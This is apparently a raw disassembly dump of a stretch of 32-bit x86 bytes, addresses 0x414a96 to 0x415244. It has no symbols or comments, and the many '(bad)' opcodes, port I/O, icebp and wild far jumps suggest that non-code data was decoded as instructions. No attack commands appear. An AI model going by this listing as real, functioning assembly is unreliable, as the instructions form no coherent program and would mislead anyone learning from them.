  414a96:	scas   eax,DWORD PTR es:[edi]
  414a97:	mov    ss,WORD PTR [ebx]
  414a99:	adc    cl,BYTE PTR [ebx]
  414a9b:	sbb    ah,BYTE PTR [edi+0xb]
  414a9e:	cmp    DWORD PTR [ecx],edx
  414aa0:	mov    DWORD PTR [ebx],ebp
  414aa2:	and    BYTE PTR ds:0x29ec1bd3,dh
  414aa8:	pop    edx
  414aa9:	sub    dh,dl
  414aab:	adc    al,0xea
  414aad:	int    0xc9
  414aaf:	pop    esp
  414ab0:	in     al,dx
  414ab1:	jbe    0x414a67
  414ab3:	pushf  
  414ab4:	and    ebx,esi
  414ab6:	enter  0x6e70,0x8e
  414aba:	loopne 0x414b3a
  414abc:	xor    cl,BYTE PTR [esi+0x4d7c6f9e]
  414ac2:	int    0x31
  414ac4:	jns    0x414b41
  414ac6:	jns    0x414a5d
  414ac8:	xchg   ecx,eax
  414ac9:	push   cs
  414aca:	dec    esi
  414acb:	jp     0x414b4b
  414acd:	inc    ebp
  414ace:	dec    ecx
  414acf:	(bad)  
  414ad0:	clc    
  414ad1:	pop    ecx
  414ad2:	xor    ebx,DWORD PTR [esi+0x281663ad]
  414ad8:	mov    WORD PTR [ebx],fs
  414ada:	adc    BYTE PTR [ebp+0x22106532],cl
  414ae0:	retf   0x386e
  414ae3:	cld    
  414ae4:	inc    ecx
  414ae5:	das    
  414ae6:	stos   BYTE PTR es:[edi],al
  414ae7:	popa   
  414ae8:	sar    BYTE PTR [ecx-0x33697cd],0x2
  414aef:	stos   DWORD PTR es:[edi],eax
  414af0:	out    dx,al
  414af1:	lock pop esp
  414af3:	push   edx
  414af4:	push   ecx
  414af5:	pop    esp
  414af6:	fmul   st,st(6)
  414af8:	xor    eax,0x600049a9
  414afd:	imul   edi,DWORD PTR [eax+0x6],0xffffff8e
  414b01:	out    0x30,eax
  414b03:	pop    ds
  414b04:	sbb    edx,esp
  414b06:	dec    ebp
  414b07:	in     al,dx
  414b08:	push   ecx
  414b09:	push   ss
  414b0a:	jno    0x414b57
  414b0c:	sar    ch,1
  414b0e:	dec    ecx
  414b0f:	jge    0x414b3c
  414b11:	pop    DWORD PTR [ecx+0x1283f8d9]
  414b17:	sbb    al,0x5f
  414b19:	gs lock push cs
  414b1c:	fs enter 0x1eeb,0xe6
  414b21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b22:	pop    edx
  414b23:	mov    WORD PTR [ecx+0x8baadaf],cs
  414b29:	pusha  
  414b2a:	xchg   esp,eax
  414b2b:	mov    dl,0x22
  414b2d:	aad    0xaa
  414b2f:	pop    esp
  414b30:	mov    al,0xf9
  414b32:	adc    BYTE PTR [bx+di-0x7edf],dl
  414b37:	jmp    0x9e7007cc
  414b3c:	pusha  
  414b3d:	enter  0xa141,0xed
  414b41:	test   al,0xe3
  414b43:	lea    edx,[ecx]
  414b45:	fisttp QWORD PTR [ebx-0x5ee15f62]
  414b4b:	cmp    BYTE PTR [esi],ah
  414b4d:	enter  0xec6,0xaa
  414b51:	repz mov ah,0xa7
  414b54:	sbb    eax,DWORD PTR [ecx]
  414b56:	xchg   BYTE PTR [esi-0x32],dl
  414b59:	dec    esi
  414b5a:	ds adc eax,0x7ce277cf
  414b60:	mov    BYTE PTR fs:[ecx+esi*2+0x6dc816b3],bh
  414b68:	dec    eax
  414b69:	popf   
  414b6a:	scas   eax,DWORD PTR es:[edi]
  414b6b:	jecxz  0x414bd6
  414b6d:	add    bh,ch
  414b6f:	mul    BYTE PTR [esi-0x247063ef]
  414b75:	fs rol dl,1
  414b78:	sbb    ch,cl
  414b7a:	add    DWORD PTR [eax-0x277735fa],esp
  414b80:	aaa    
  414b81:	xchg   ebp,edx
  414b83:	push   edx
  414b84:	loopne 0x414b35
  414b86:	outs   dx,DWORD PTR ds:[esi]
  414b87:	push   edi
  414b88:	inc    edx
  414b89:	arpl   WORD PTR [edx-0x4c],cx
  414b8c:	imul   eax,DWORD PTR [edx],0xffffff8f
  414b8f:	lods   eax,DWORD PTR ds:[esi]
  414b90:	xchg   esp,eax
  414b91:	test   BYTE PTR [eax-0x38],bh
  414b94:	ficom  WORD PTR [edi-0x5a6f3808]
  414b9a:	mov    ebp,0xb2df3c0f
  414b9f:	lea    ebp,[ebp+0x539c0a2a]
  414ba5:	je     0x414bf5
  414ba7:	push   edx
  414ba8:	imul   esi,DWORD PTR [esi+0x23],0x74
  414bac:	mov    ds:0xbfa80d1c,al
  414bb1:	mov    eax,ds:0xa4333677
  414bb6:	js     0x414b8a
  414bb8:	sub    bl,BYTE PTR [edi-0x262fc0bf]
  414bbe:	mov    eax,ds:0xa2341f3d
  414bc3:	push   ecx
  414bc4:	pop    ss
  414bc5:	mov    eax,0x5cd09a0f
  414bca:	mov    al,0xad
  414bcc:	mov    al,BYTE PTR [ebx-0xd]
  414bcf:	sub    eax,DWORD PTR [edi-0x77b46e83]
  414bd5:	div    edi
  414bd7:	lods   eax,DWORD PTR ds:[esi]
  414bd8:	stos   DWORD PTR es:[edi],eax
  414bd9:	mov    eax,0x45d54e9b
  414bde:	fist   WORD PTR ds:0x925f62ff
  414be4:	mov    ch,0xf
  414be6:	test   DWORD PTR [edx],esi
  414be8:	xchg   esi,eax
  414be9:	clc    
  414bea:	imul   ebp,DWORD PTR ds:0x91a6da3b,0xfffffff4
  414bf1:	es and al,0x7d
  414bf4:	lds    edi,FWORD PTR [ebp+esi*1+0x5372a074]
  414bfb:	adc    eax,0x9c73cc3
  414c00:	xor    al,0x5c
  414c02:	mov    BYTE PTR [edx+0x6dccd993],dl
  414c08:	retf   0x5a74
  414c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c0c:	mov    dl,0x4b
  414c0e:	xor    ebx,DWORD PTR [eax-0x3a90aa90]
  414c14:	lods   eax,DWORD PTR ds:[esi]
  414c15:	push   ebx
  414c16:	and    dh,cl
  414c18:	cmp    eax,0x233697d
  414c1d:	mov    ah,0xb6
  414c1f:	sub    eax,0x7b0518b3
  414c24:	bound  esi,QWORD PTR [ecx+0x7ddaece9]
  414c2a:	dec    esi
  414c2b:	pop    ecx
  414c2c:	fld    TBYTE PTR [edx]
  414c2e:	cmp    BYTE PTR [edi-0x78035a4b],ch
  414c34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c35:	bound  esp,QWORD PTR [edx+0x979113f]
  414c3b:	repnz dec eax
  414c3d:	out    dx,eax
  414c3e:	out    dx,al
  414c3f:	dec    ecx
  414c40:	repz push es
  414c42:	clc    
  414c43:	aad    0xc2
  414c45:	or     bh,BYTE PTR [ebx+0x6e]
  414c48:	ins    DWORD PTR es:[edi],dx
  414c49:	fsubr  DWORD PTR [ecx+0x58c5577]
  414c4f:	imul   DWORD PTR [esi-0x7d]
  414c52:	int    0x1a
  414c54:	add    al,0x2a
  414c56:	ret    
  414c57:	xlat   BYTE PTR ds:[ebx]
  414c58:	jno    0x414c19
  414c5a:	scas   eax,DWORD PTR es:[edi]
  414c5b:	out    0xb9,eax
  414c5d:	sbb    eax,0x9aa2179a
  414c62:	fisttp QWORD PTR [edi-0x13]
  414c65:	or     al,0x5
  414c67:	into   
  414c68:	lea    esi,[edx]
  414c6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c6b:	bound  ebx,QWORD PTR [ecx]
  414c6d:	and    bl,BYTE PTR ds:[esi-0x13c8c190]
  414c74:	xchg   ebx,eax
  414c75:	jae    0x414c02
  414c77:	inc    ebx
  414c78:	daa    
  414c79:	inc    edi
  414c7a:	push   edx
  414c7b:	popf   
  414c7c:	std    
  414c7d:	popa   
  414c7e:	ss xor al,0x9f
  414c81:	ss mov esi,0xf69ef35
  414c87:	leave  
  414c88:	and    DWORD PTR [eax],esp
  414c8a:	inc    eax
  414c8b:	ror    DWORD PTR [ebx-0x75],cl
  414c8e:	xchg   ebp,eax
  414c8f:	add    eax,0x5f99b7a5
  414c94:	out    dx,al
  414c95:	push   ss
  414c96:	mov    edx,0xd83a2285
  414c9b:	cmc    
  414c9c:	sub    al,0xf5
  414c9e:	repnz cmp ebx,DWORD PTR [ecx+0x27]
  414ca2:	mov    ebp,0x66821667
  414ca7:	xchg   ebp,eax
  414ca8:	xchg   BYTE PTR [ecx+0x49],ah
  414cab:	jno    0x414cb0
  414cad:	and    ah,BYTE PTR cs:[ebp+0xbf7018e]
  414cb4:	mov    edx,0x6066934f
  414cb9:	pop    ss
  414cba:	loop   0x414cba
  414cbc:	cmp    dh,bh
  414cbe:	inc    eax
  414cbf:	test   DWORD PTR [ebx+0x33],0xa845d25
  414cc6:	adc    al,0xdd
  414cc8:	(bad)  
  414cc9:	push   eax
  414cca:	in     eax,dx
  414ccb:	cmp    ecx,DWORD PTR [eax-0x73656ecb]
  414cd1:	dec    esp
  414cd2:	icebp  
  414cd3:	mov    ds:0x966dd65e,eax
  414cd8:	clc    
  414cd9:	call   0x4f7e:0xb72689be
  414ce0:	shl    DWORD PTR [esi+0x65],1
  414ce3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ce4:	stos   DWORD PTR es:[edi],eax
  414ce5:	add    al,0x82
  414ce7:	retf   0x7dca
  414cea:	in     al,dx
  414ceb:	int3   
  414cec:	shl    DWORD PTR [ebp+0x7d36dfd1],cl
  414cf2:	icebp  
  414cf3:	and    ah,BYTE PTR [eax+0x44d76620]
  414cf9:	jmp    0x2412da20
  414cfe:	adc    DWORD PTR [edx],ebx
  414d00:	out    dx,eax
  414d01:	nop
  414d02:	add    al,0x98
  414d04:	cmp    BYTE PTR [eax+0xfb5e191],dh
  414d0a:	push   edi
  414d0b:	adc    al,0x77
  414d0d:	sub    BYTE PTR [eax+ebp*1-0x69645878],cl
  414d14:	sbb    ah,BYTE PTR [edi-0x1156cad4]
  414d1a:	mov    esp,0x82ae2f02
  414d1f:	pop    esi
  414d20:	cmp    bh,BYTE PTR [ecx+0x3205a128]
  414d26:	cwde   
  414d27:	cmp    esi,DWORD PTR [eax+0x107753e9]
  414d2d:	retf   0x71d5
  414d30:	sti    
  414d31:	ins    BYTE PTR es:[edi],dx
  414d32:	dec    eax
  414d33:	dec    ebp
  414d34:	fadd   st(3),st
  414d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d37:	leave  
  414d38:	mov    dl,0x15
  414d3a:	add    DWORD PTR [edi],ecx
  414d3c:	sub    al,0x22
  414d3e:	cld    
  414d3f:	shl    DWORD PTR [eax-0x2d9d246d],1
  414d45:	lea    ecx,[edx+edx*4]
  414d48:	pop    ds
  414d49:	fnstcw WORD PTR [ebp+eiz*8-0x70]
  414d4d:	fisttp QWORD PTR [edi]
  414d4f:	or     ebx,0xffffffd2
  414d52:	lods   al,BYTE PTR ds:[esi]
  414d53:	jmp    0x4a3b:0x48b1edc8
  414d5a:	push   0x2d
  414d5c:	stos   BYTE PTR es:[edi],al
  414d5d:	add    bh,0x19
  414d60:	pop    edx
  414d61:	dec    ebp
  414d62:	push   edx
  414d63:	pop    ss
  414d64:	jmp    0xfc90411d
  414d69:	repnz sub DWORD PTR [edx+ecx*2],eax
  414d6d:	repnz xchg cl,al
  414d70:	and    DWORD PTR [ebx],esi
  414d72:	sbb    eax,0x1845c912
  414d77:	sar    DWORD PTR [esi-0x7b1aa4b5],1
  414d7d:	scas   al,BYTE PTR es:[edi]
  414d7e:	mov    dh,0xd5
  414d80:	sub    BYTE PTR [esi-0x74],ch
  414d83:	scas   al,BYTE PTR es:[edi]
  414d84:	pop    ss
  414d85:	daa    
  414d86:	(bad)  
  414d87:	(bad)  
  414d88:	xchg   edx,eax
  414d89:	or     dh,BYTE PTR [ebp+0x5865b3ca]
  414d8f:	aaa    
  414d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d91:	dec    esi
  414d92:	pop    ss
  414d93:	imul   ebx,DWORD PTR [esi+0x75c973b9],0x18
  414d9a:	pop    ss
  414d9b:	ficomp DWORD PTR [edi+0x6c]
  414d9e:	xchg   ecx,eax
  414d9f:	sti    
  414da0:	add    dl,BYTE PTR [eax+0x4c1508e7]
  414da6:	pop    esp
  414da7:	push   edx
  414da8:	sub    BYTE PTR [ebp+0x64f382b1],bl
  414dae:	xlat   BYTE PTR ds:[ebx]
  414daf:	sahf   
  414db0:	jmp    0xc2c4bded
  414db5:	scas   al,BYTE PTR es:[edi]
  414db6:	pop    ss
  414db7:	mov    ebp,0x22d9d2ff
  414dbc:	call   0xea0982c1
  414dc1:	xchg   ebp,eax
  414dc2:	fwait
  414dc3:	ret    
  414dc4:	das    
  414dc5:	cld    
  414dc6:	mov    DWORD PTR [ebp+eiz*1-0x27f1f71d],ecx
  414dcd:	(bad)  
  414dce:	aam    0x3c
  414dd0:	fnstenv [edi]
  414dd2:	xor    al,0x53
  414dd4:	xchg   esi,eax
  414dd5:	or     BYTE PTR [ebp-0xe],dl
  414dd8:	shr    DWORD PTR [edx+0xffa4edd],cl
  414dde:	sub    BYTE PTR [ebx],al
  414de0:	push   ebx
  414de1:	push   esp
  414de2:	xchg   ebp,eax
  414de3:	inc    esi
  414de4:	(bad)  
  414de5:	jmp    0x4879:0xd0dc4375
  414dec:	mov    ds:0xf0f98764,al
  414df1:	ins    BYTE PTR es:[edi],dx
  414df2:	mov    edi,0xa04ebe84
  414df7:	or     BYTE PTR [esi+0x20],ch
  414dfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414dfb:	ret    0x9b20
  414dfe:	fst    QWORD PTR [ecx-0x16]
  414e01:	cmp    edi,DWORD PTR [edx-0x1fee4f0b]
  414e07:	inc    ebx
  414e08:	aad    0xdb
  414e0a:	inc    eax
  414e0b:	mov    ebx,0x49c98d13
  414e10:	lea    eax,[ebx+eiz*1-0x16fc46cd]
  414e17:	xchg   ebx,eax
  414e18:	popf   
  414e19:	leave  
  414e1a:	clc    
  414e1b:	xor    ebx,edi
  414e1d:	sbb    ebx,DWORD PTR [eax]
  414e1f:	sti    
  414e20:	push   ecx
  414e21:	test   al,0xfd
  414e23:	and    eax,0x12cfb25a
  414e28:	loopne 0x414e45
  414e2a:	mov    dh,0x2a
  414e2c:	and    BYTE PTR [ecx+0x4eef8f95],0xef
  414e33:	mov    esi,0x6e77384e
  414e38:	jp     0x414e67
  414e3a:	stos   DWORD PTR es:[edi],eax
  414e3b:	cmp    ebx,edi
  414e3d:	out    dx,eax
  414e3e:	clc    
  414e3f:	int    0x3c
  414e41:	xchg   ecx,eax
  414e42:	test   eax,0xa37d8865
  414e47:	mov    ebp,0x544b711e
  414e4c:	(bad)  
  414e4d:	mov    ebp,0x16bdbae9
  414e52:	dec    BYTE PTR [esi+0x75]
  414e55:	mul    bl
  414e57:	mov    edx,0xd95c1d79
  414e5c:	jmp    0x414ed6
  414e5e:	stos   BYTE PTR es:[edi],al
  414e5f:	icebp  
  414e60:	push   ebx
  414e61:	test   DWORD PTR [esi],edx
  414e63:	jb     0x414ec3
  414e65:	dec    eax
  414e66:	popf   
  414e67:	js     0x414e5d
  414e69:	add    eax,0xf9cac895
  414e6e:	stc    
  414e6f:	inc    edx
  414e70:	je     0x414e06
  414e72:	sbb    BYTE PTR [edi-0x6],dh
  414e75:	cdq    
  414e76:	mov    bl,0x3d
  414e78:	stc    
  414e79:	and    ecx,DWORD PTR [ebp-0x6a0dc2fc]
  414e7f:	mov    ebp,0xb43015ff
  414e84:	mov    ds,ebx
  414e86:	and    al,0xf5
  414e88:	dec    esp
  414e89:	shr    DWORD PTR [esi+0x7c44e348],1
  414e8f:	(bad)  
  414e90:	jne    0x414e29
  414e92:	or     esi,ecx
  414e94:	xor    DWORD PTR [ebx-0x3b089405],0x15
  414e9b:	dec    ebx
  414e9c:	cs ds (bad) 
  414e9f:	jb     0x414f1e
  414ea1:	cli    
  414ea2:	and    ebx,DWORD PTR [edi-0x692c8545]
  414ea8:	sbb    DWORD PTR [ebp+0x4b1755c1],0xffffffb1
  414eaf:	dec    ebx
  414eb0:	adc    BYTE PTR [eax+0xb2d1dc2],bh
  414eb6:	add    al,0x4b
  414eb8:	xchg   ebx,eax
  414eb9:	pop    es
  414eba:	neg    DWORD PTR [ecx+0x4b813bc1]
  414ec0:	sub    BYTE PTR [ecx],ch
  414ec2:	ret    0x7534
  414ec5:	mov    DWORD PTR [ecx],0xbfdd8c4
  414ecb:	cmc    
  414ecc:	cmp    BYTE PTR [edi-0x6c350165],bh
  414ed2:	lods   al,BYTE PTR ds:[esi]
  414ed3:	out    dx,al
  414ed4:	div    DWORD PTR [edx]
  414ed6:	scas   al,BYTE PTR es:[edi]
  414ed7:	xchg   BYTE PTR [edi-0x15],bl
  414eda:	les    ecx,FWORD PTR [ecx]
  414edc:	call   0xb6881cc4
  414ee1:	sbb    dl,0x94
  414ee4:	push   ebx
  414ee5:	(bad)  
  414ee6:	mov    ah,0xd8
  414ee8:	icebp  
  414ee9:	push   ecx
  414eea:	fs sub ecx,ecx
  414eed:	sub    eax,0x2dd40cd5
  414ef2:	adc    eax,0xf498f808
  414ef7:	mov    dh,0x22
  414ef9:	mov    al,0xa9
  414efb:	mov    ds:0xbb1ac9f5,al
  414f00:	mov    DWORD PTR [edi],ecx
  414f02:	sbb    DWORD PTR [edx-0x6c],0xffffffe7
  414f06:	lock test BYTE PTR [edi+0x6e888485],0x32
  414f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f0f:	xchg   edx,eax
  414f10:	repz adc al,0x68
  414f13:	and    ah,BYTE PTR [ecx]
  414f15:	out    0x8,eax
  414f17:	inc    esi
  414f18:	or     al,0xc3
  414f1a:	xor    cl,bh
  414f1c:	(bad)  
  414f1e:	sti    
  414f1f:	push   ds
  414f20:	jle    0x414ef3
  414f22:	shr    DWORD PTR [ebx-0x3ef56926],cl
  414f28:	pop    esp
  414f29:	inc    ebp
  414f2a:	out    0x72,eax
  414f2c:	push   ss
  414f2d:	and    eax,0x5e1bcbd7
  414f32:	cmp    DWORD PTR [esi-0x507f47dc],0xf36523ac
  414f3c:	mov    al,ds:0xb43afc34
  414f41:	add    ecx,esi
  414f43:	pop    ds
  414f44:	jmp    0x4d9a:0x301610ec
  414f4b:	inc    ecx
  414f4c:	fsubr  st(5),st
  414f4e:	mov    ch,0x10
  414f50:	mov    ebx,DWORD PTR [esp+esi*2]
  414f53:	enter  0xaffa,0x71
  414f57:	daa    
  414f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f59:	adc    BYTE PTR [edi-0x659812b7],ah
  414f5f:	mov    esp,0xd3955570
  414f64:	inc    edx
  414f65:	xlat   BYTE PTR ds:[ebx]
  414f66:	int    0x26
  414f68:	lock mov ds:0xf83b0098,eax
  414f6e:	push   esp
  414f6f:	push   ecx
  414f70:	lea    edx,[eax]
  414f72:	mov    eax,0xbf0f279
  414f77:	xor    cl,dh
  414f79:	bound  ebx,QWORD PTR ds:0x5179f1ea
  414f7f:	xor    dh,BYTE PTR [esi]
  414f81:	das    
  414f82:	je     0x414fc8
  414f84:	xor    DWORD PTR [edi],ecx
  414f86:	adc    al,0xe3
  414f88:	popf   
  414f89:	scas   al,BYTE PTR es:[edi]
  414f8a:	sbb    al,0x42
  414f8c:	sahf   
  414f8d:	add    edi,DWORD PTR [esp-0x220920c6]
  414f94:	jnp    0x414fd9
  414f96:	pop    eax
  414f97:	dec    edx
  414f98:	and    DWORD PTR es:[eax+0x6cbe52f3],edi
  414f9f:	(bad)  
  414fa0:	pop    ebx
  414fa1:	cmp    ah,BYTE PTR [eax-0x6acf4802]
  414fa7:	jnp    0x414f46
  414fa9:	fstp   st(3)
  414fab:	dec    edi
  414fac:	mov    BYTE PTR [esp+eiz*8],bl
  414faf:	adc    al,0x2f
  414fb1:	inc    ebp
  414fb2:	hlt    
  414fb3:	popf   
  414fb4:	in     al,0xa9
  414fb6:	xor    BYTE PTR [eax+0x1d],al
  414fb9:	xor    eax,0xa5e39f69
  414fbe:	scas   eax,DWORD PTR es:[edi]
  414fbf:	sub    eax,DWORD PTR [ecx+ebx*8-0x46]
  414fc3:	mov    bl,bl
  414fc5:	adc    al,0x38
  414fc7:	stc    
  414fc8:	aad    0x3c
  414fca:	ficom  DWORD PTR [ecx+ecx*1]
  414fcd:	mov    edx,0x2c021bea
  414fd2:	sbb    edi,0x32
  414fd5:	pop    edx
  414fd6:	enter  0xccd,0x5c
  414fda:	xlat   BYTE PTR ds:[ebx]
  414fdb:	xchg   dh,cl
  414fdd:	enter  0xf352,0x30
  414fe1:	in     al,0x45
  414fe3:	call   0x4b806d88
  414fe8:	mov    cl,0xc7
  414fea:	mov    dh,0xe9
  414fec:	or     DWORD PTR [edi-0x295b717d],esi
  414ff2:	scas   eax,DWORD PTR es:[edi]
  414ff3:	(bad)  
  414ff4:	jg     0x41505c
  414ff6:	mov    ebp,0x1c04b859
  414ffb:	cmp    eax,DWORD PTR [ebx+0xe]
  414ffe:	pop    ebx
  414fff:	rcr    BYTE PTR [ecx],cl
  415001:	sbb    BYTE PTR [edx-0x32f86c4f],0xc2
  415008:	xchg   edx,eax
  415009:	xor    al,al
  41500b:	int    0x54
  41500d:	mov    al,0x5e
  41500f:	das    
  415010:	rcr    DWORD PTR [esi+eiz*2+0x68ef5f64],cl
  415017:	or     cl,BYTE PTR cs:[edi+0x6764530f]
  41501e:	outs   dx,DWORD PTR ds:[esi]
  41501f:	sbb    DWORD PTR [ebx+0x66],edx
  415022:	ja     0x41506c
  415024:	repnz lods eax,DWORD PTR ds:[esi]
  415026:	mov    esp,0x78aa2c7f
  41502b:	addr16 xchg esi,eax
  41502d:	ins    BYTE PTR es:[edi],dx
  41502e:	sub    al,0xa5
  415030:	test   ebx,0x916193ac
  415036:	sbb    BYTE PTR [eax],ch
  415038:	popa   
  415039:	cli    
  41503a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41503b:	test   DWORD PTR [edx+0x62],0x9bfbda99
  415042:	sbb    eax,0x3f48a4e9
  415047:	jae    0x41506d
  415049:	fst    DWORD PTR [esi+0x3b771d5f]
  41504f:	and    al,0x24
  415051:	adc    al,0xec
  415053:	ins    BYTE PTR es:[edi],dx
  415054:	cmp    ecx,DWORD PTR [ebx]
  415056:	cld    
  415057:	jbe    0x415090
  415059:	cmc    
  41505a:	sub    BYTE PTR [ebp+edx*1+0x8],al
  41505e:	add    BYTE PTR [esi+0x24308c8d],al
  415064:	mov    cl,0xc7
  415066:	fistp  DWORD PTR [ebp-0x7b]
  415069:	sbb    BYTE PTR [ecx+0x19],cl
  41506c:	lea    esp,[ecx-0x65]
  41506f:	mov    bl,0xba
  415071:	gs sti 
  415073:	ret    0xcc2
  415076:	xchg   ecx,eax
  415077:	lds    edx,FWORD PTR [esi-0x7570d943]
  41507d:	cmp    al,0xa6
  41507f:	test   eax,0x1ba80012
  415084:	(bad)  
  415085:	out    dx,al
  415086:	xchg   esp,eax
  415087:	das    
  415088:	fisubr DWORD PTR [edi+eiz*2-0x77]
  41508c:	ret    0xf4ba
  41508f:	jg     0x415019
  415091:	xor    ah,BYTE PTR [eax+0x20]
  415094:	xchg   ecx,eax
  415095:	daa    
  415096:	das    
  415097:	push   ecx
  415098:	cs jge 0x4150d0
  41509b:	add    esi,DWORD PTR [ecx]
  41509d:	dec    DWORD PTR [edi-0x73]
  4150a0:	icebp  
  4150a1:	cmc    
  4150a2:	adc    DWORD PTR [edi+0x53],0xffffffb8
  4150a6:	das    
  4150a7:	jge    0x4150db
  4150a9:	inc    esp
  4150aa:	or     DWORD PTR [ebx-0x73dd4158],ebx
  4150b0:	cmp    al,BYTE PTR [edx]
  4150b2:	loope  0x415071
  4150b4:	jo     0x4150d2
  4150b6:	je     0x4150ce
  4150b8:	mov    esi,0x7d6a0418
  4150bd:	(bad)  
  4150be:	out    dx,eax
  4150bf:	out    0x76,al
  4150c1:	cli    
  4150c2:	jge    0x41512d
  4150c4:	dec    BYTE PTR [eax-0x5f]
  4150c7:	mov    edi,0xac82077e
  4150cc:	cwde   
  4150cd:	fstp   DWORD PTR [edi]
  4150cf:	mov    esp,0x4dda791d
  4150d4:	scas   eax,DWORD PTR es:[edi]
  4150d5:	sub    BYTE PTR [esi+edi*8-0x1b36b8fc],ah
  4150dc:	xchg   edi,eax
  4150dd:	mov    ecx,0xc2b386d6
  4150e2:	ins    BYTE PTR es:[edi],dx
  4150e3:	mov    ch,0x44
  4150e5:	jp     0x415136
  4150e7:	and    esi,DWORD PTR [eax-0x4b85ea6a]
  4150ed:	lea    edx,[ebx]
  4150ef:	add    eax,0xe3894ada
  4150f4:	jge    0x41514d
  4150f6:	xchg   BYTE PTR [ebp+edi*4+0x51ee2e38],ch
  4150fd:	fwait
  4150fe:	xchg   edi,eax
  4150ff:	aam    0x3d
  415101:	jae    0x415119
  415103:	je     0x4150b9
  415105:	inc    esp
  415106:	gs dec eax
  415108:	xchg   edx,ecx
  41510a:	cli    
  41510b:	arpl   WORD PTR [esi],si
  41510d:	(bad)  
  41510e:	aad    0x29
  415110:	jle    0x4150b3
  415112:	inc    edx
  415113:	mov    DWORD PTR [esi],ebx
  415115:	pop    ss
  415116:	test   DWORD PTR [edi],esp
  415118:	mov    bl,0x5f
  41511a:	add    BYTE PTR [eax+0x55884a1b],ah
  415120:	lock push ds
  415122:	es cld 
  415124:	mov    al,0x3e
  415126:	mov    ah,0xb0
  415128:	pop    ds
  415129:	out    0xce,al
  41512b:	(bad)  
  41512c:	jnp    0x415176
  41512e:	in     al,dx
  41512f:	mov    cl,0x87
  415131:	xlat   BYTE PTR ds:[ebx]
  415132:	fstp   TBYTE PTR [edi+0x14fea05f]
  415138:	mov    ds:0x8a4f437a,eax
  41513d:	mov    bh,0x45
  41513f:	cdq    
  415140:	popf   
  415141:	sbb    BYTE PTR ds:0xd6c961ef,ch
  415147:	mov    ebp,0x6b830426
  41514c:	mov    ecx,0xbaa301fe
  415151:	lds    esp,FWORD PTR [ecx+edx*8+0x4d]
  415155:	stos   DWORD PTR es:[edi],eax
  415156:	mov    DWORD PTR [edi],eax
  415158:	mov    esi,0xdbc6ebee
  41515d:	pop    ebp
  41515e:	call   DWORD PTR [ebx-0x17]
  415161:	add    BYTE PTR [esi+0x59a3dc8e],dh
  415167:	push   0x32
  415169:	loop   0x4151c4
  41516b:	cmc    
  41516c:	loop   0x415185
  41516e:	mov    ebx,DWORD PTR [edi-0x6a]
  415171:	jns    0x41510f
  415173:	dec    edi
  415174:	in     eax,0xe5
  415176:	fiadd  DWORD PTR es:[ebp+ebx*2+0x5d]
  41517b:	xchg   BYTE PTR [esi+0x8],bh
  41517e:	sub    al,0xcd
  415180:	rcl    DWORD PTR [esp+eax*1+0x454723df],cl
  415187:	add    dh,cl
  415189:	ss xchg ecx,eax
  41518b:	out    dx,eax
  41518c:	jg     0x4151a5
  41518e:	add    DWORD PTR [edi+0x237a8f20],esi
  415194:	cmp    ecx,edx
  415196:	cmc    
  415197:	das    
  415198:	or     ch,ah
  41519a:	add    al,0x7d
  41519c:	jmp    0x7b62a9ba
  4151a1:	xor    dh,bl
  4151a3:	push   0x6f
  4151a5:	push   ds
  4151a6:	pop    eax
  4151a7:	(bad)  [esi-0x71035380]
  4151ad:	cwde   
  4151ae:	or     dl,ah
  4151b0:	stos   DWORD PTR es:[edi],eax
  4151b1:	in     al,dx
  4151b2:	(bad)  [ecx]
  4151b4:	enter  0xe5e3,0xa0
  4151b8:	mov    bh,al
  4151ba:	icebp  
  4151bb:	in     eax,0x52
  4151bd:	and    BYTE PTR [esp+ebx*4-0x69],dh
  4151c1:	adc    al,0x8d
  4151c3:	and    BYTE PTR [edi],dl
  4151c5:	rcl    BYTE PTR [eax+0x2e],0x84
  4151c9:	in     eax,0x6e
  4151cb:	idiv   DWORD PTR fs:[edx+0x26ad7ee3]
  4151d2:	lahf   
  4151d3:	inc    ecx
  4151d4:	fisttp WORD PTR [eax+0x5ff8ca31]
  4151da:	push   ss
  4151db:	stos   DWORD PTR es:[edi],eax
  4151dc:	xlat   BYTE PTR ds:[ebx]
  4151dd:	push   ebx
  4151de:	xchg   edi,eax
  4151df:	lahf   
  4151e0:	jbe    0x415190
  4151e2:	sbb    cl,BYTE PTR [edi]
  4151e4:	jb     0x415254
  4151e6:	jmp    0xa02553e4
  4151eb:	rcl    DWORD PTR ds:0x73fd68c6,cl
  4151f1:	and    DWORD PTR [edx],esi
  4151f3:	scas   al,BYTE PTR es:[edi]
  4151f4:	xchg   ecx,eax
  4151f5:	cld    
  4151f6:	mov    ch,0x96
  4151f8:	xor    BYTE PTR [edx+0x46],al
  4151fb:	push   cs
  4151fc:	add    bl,0x1d
  4151ff:	pusha  
  415200:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415201:	xchg   ebp,eax
  415202:	sbb    BYTE PTR [esi-0x6f],al
  415205:	pop    esi
  415206:	stos   BYTE PTR es:[edi],al
  415207:	jb     0x4151fe
  415209:	mov    BYTE PTR [ebx+0xef08111],bh
  41520f:	mov    esi,0x967576b4
  415214:	stc    
  415215:	mov    eax,ds:0xfc3a0975
  41521a:	cmp    BYTE PTR [esp+ebp*2-0x69],0x8a
  41521f:	fiadd  DWORD PTR [eax+0x72]
  415222:	inc    ecx
  415223:	ins    DWORD PTR es:[edi],dx
  415224:	lahf   
  415225:	pop    eax
  415226:	iret   
  415227:	sub    eax,0xe59530c2
  41522c:	and    DWORD PTR [eax+0x66],ebx
  41522f:	mov    ah,0xb3
  415231:	mov    ecx,DWORD PTR [ebx+eax*4-0x3]
  415235:	gs add bh,dl
  415238:	and    BYTE PTR [esi+ecx*1],al
  41523b:	cmp    eax,0x6b3e24b
  415240:	xlat   BYTE PTR ds:[ebx]
  415241:	in     al,dx
  415242:	loop   0x41526e
  415244:	jg     0x4151c7
